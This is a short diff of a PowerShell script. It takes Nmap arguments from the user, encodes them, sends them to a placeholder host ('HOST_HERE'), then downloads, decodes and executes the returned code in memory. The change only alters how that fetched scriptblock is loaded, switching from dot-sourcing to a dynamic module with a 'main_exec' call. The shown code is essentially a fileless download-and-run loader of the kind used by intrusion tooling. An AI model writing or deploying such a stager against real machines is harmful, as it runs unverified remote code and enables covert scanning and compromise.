@@ -14,4 +14,5 @@ $decode = {
 }
 $nmap_args = Read-Host "Provide arguments as you would to NMap"
 $args = &$encode $nmap_args
-. ([Scriptblock]::Create((&$decode (Invoke-WebRequest -Uri "HOST_HERE/?args=$args").Content)))
+$module = New-Module -ScriptBlock ([Scriptblock]::Create((&$decode (Invoke-WebRequest -Uri "HOST_HERE/?args=$args").Content))) -AsCustomObject
+$module.main_exec()
